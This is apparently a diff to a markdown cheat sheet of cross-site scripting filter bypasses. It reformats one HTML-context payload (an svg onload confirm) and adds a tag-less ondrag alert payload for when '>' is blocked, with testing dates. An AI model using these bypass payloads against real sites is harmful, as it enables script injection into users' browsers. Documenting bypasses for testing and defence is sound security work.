@@ -38,12 +38,15 @@ For Attribute context use:
 
 ### HTML Context
 
-For HTML context use:
+* For HTML context use:
 
-`<svg/oni=on onload=confirm(2)>`
+`<svg/oni=on onload=confirm(2)>` Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)
 
-Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)
+* When `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:
+
+`<o oni=on ondrag=alert(1)>Drag Me` -> then highlight text and drag it to trigger XSS (Crafted on `February 01, 2022`)
+
 
 ---
 
-Bypasses tested on: `August 26, 2021`
+Bypasses tested on: `August 26, 2021` and `February 01, 2022`
